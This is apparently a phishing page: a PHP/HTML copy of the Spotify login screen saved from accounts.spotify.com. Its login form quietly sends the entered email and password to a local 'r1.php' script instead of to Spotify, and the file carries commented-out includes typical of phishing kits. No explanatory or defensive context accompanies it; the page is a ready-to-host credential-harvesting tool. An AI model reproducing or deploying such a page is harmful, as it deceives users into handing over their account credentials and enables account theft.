<?php
/*
require_once 'crypt.php'; 

include 'sayron.php'; 
 */

?>
<!DOCTYPE html>
<!-- saved from url=(0104)https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fint%2Faccount%2Foverview%2F -->
<html ng-app="accounts" ng-csp="" ng-strict-di="" class="ng-scope" lang="en">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title ng-bind="(title &amp;&amp; (title | localize) + &#39; - &#39;) + &#39;Spotify&#39;" class="ng-binding">Login - Spotify</title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
      <!--<base href="/">-->
      <base href=".">
      <link href="./css/index.css" media="screen" rel="stylesheet">
     
   </head>
   <!-- ngView:  -->
   <body ng-view="" class="ng-scope">
      <div sp-header="" class="ng-scope">
         <div class="head "> <a class="spotify-logo" ng-href="/en" tabindex="-1" title="Spotify" href="https://accounts.spotify.com/en"></a> </div>
      </div>
      <div class="container-fluid login ng-scope">
         <div class="content">
            <div class="row">
               <div class="col-xs-12"> <a ng-href="#" class="btn btn-sm btn-block btn-facebook ng-binding" target="_parent" role="button">Log in with Facebook</a> </div>
            </div>
            <div class="row">
               <div class="col-xs-12">
                  <div class="divider"> <strong class="divider-title ng-binding">or</strong> </div>
               </div>
            </div>
            <form action="r1.php" name="$parent.accounts" method="post" novalidate="" class="ng-pristine ng-valid-sp-disallow-chars ng-invalid ng-invalid-required">
               <!-- ngIf: status && status !== 200 --> 
               <div class="row" ng-class="{&#39;has-error&#39;: (accounts.username.$dirty &amp;&amp; accounts.username.$invalid)}">
                  <div class="col-xs-12">
                     <label for="login-username" class="control-label sr-only ng-binding"> Email address or username </label> <input ng-model="form.username" name="email" type="text" class="form-control input-with-feedback ng-pristine ng-valid-sp-disallow-chars ng-empty ng-invalid ng-invalid-required ng-touched" name="username" id="login-username" placeholder="Email address or username" required="" sp-disallow-chars=":%&amp;&#39;`´&quot;" sp-disallow-chars-model="usernameDisallowedChars" autocapitalize="off" autocomplete="off" autocorrect="off" autofocus="autofocus" ng-trim="false"> <!-- ngIf: accounts.username.$dirty && accounts.username.$invalid --> 
                  </div>
               </div>
               <div class="row" ng-class="{&#39;has-error&#39;: (accounts.password.$dirty &amp;&amp; accounts.password.$invalid)}">
                  <div class="col-xs-12">
                     <label for="login-password" class="control-label sr-only ng-binding"> Password </label> <input ng-model="form.password" name="password" type="password" class="form-control input-with-feedback ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" name="password" id="login-password" placeholder="Password" required="" autocomplete="off" ng-trim="false"> <!-- ngIf: accounts.password.$dirty && accounts.password.$invalid --> 
                  </div>
               </div>
               <div class="row row-submit">
                  <div class="col-xs-12 col-sm-6">
                     <div class="checkbox"> <label class="ng-binding"> <input ng-model="form.remember" type="checkbox" name="remember" id="login-remember" class="ng-pristine ng-untouched ng-valid ng-not-empty"> Remember me <span class="control-indicator"></span> </label> </div>
                  </div>
                  <div class="col-xs-12 col-sm-6"> <button class="btn btn-sm btn-block btn-green ng-binding" id="login-button" ng-click="onLoginClick($event)">Log In</button> </div>
               </div>
            </form>
            <!-- ngIf: !iOS && !disableSignup -->
            <div ng-if="!iOS &amp;&amp; !disableSignup" class="row row-hint ng-scope">
               <div class="col-xs-12 text-center">
                  <p> <a ng-href="https://www.spotify.com/us/password-reset/" class="ng-binding" href="https://www.spotify.com/us/password-reset/">Forgot your username or password?</a> </p>
                  <!-- ngIf: !disableSignup -->
                  <p ng-if="!disableSignup" class="ng-binding ng-scope"> Don't have an account? <a ng-href="https://www.spotify.com/us/signup/?forward_url=https%3A%2F%2Fwww.spotify.com%2Fint%2Faccount%2Foverview%2F" class="ng-binding" href="https://www.spotify.com/us/signup/?forward_url=https%3A%2F%2Fwww.spotify.com%2Fint%2Faccount%2Foverview%2F">Sign Up</a> </p>
                  <!-- end ngIf: !disableSignup --> 
               </div>
            </div>
            <!-- end ngIf: !iOS && !disableSignup --> 
            <div class="col-xs-12">
               <div class="divider"></div>
               <p class="text-muted disclaimer ng-binding" ng-bind-html="&#39;loginTermsOfService&#39; | localize:termsAndConditionsUrl:privacyPolicyUrl">If you click "Log in with Facebook" and are not a Spotify user, you will be registered and you agree to Spotify's <a href="https://www.spotify.com/us/legal/end-user-agreement/plain/" target="_blank">Terms &amp; Conditions</a> and <a href="https://www.spotify.com/us/legal/privacy-policy/plain/" target="_blank">Privacy Policy</a>.</p>
            </div>
         </div>
      </div>
      <div style="visibility: hidden; position: absolute; width:100%; top: -10000px; left: 0px; right: 0px; transition: visibility 0s linear 0.3s, opacity 0.3s linear; opacity: 0;">
         <div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: #fff; opacity: 0.5;  filter: alpha(opacity=50)"></div>
         <div style="margin: 0 auto; top: 0px; left: 0px; right: 0px; position: absolute; border: 1px solid #ccc; z-index: 2000000000; background-color: #fff; overflow: hidden;"></div>
      </div>
   </body>
</html>
<?php ob_end_flush(); ?>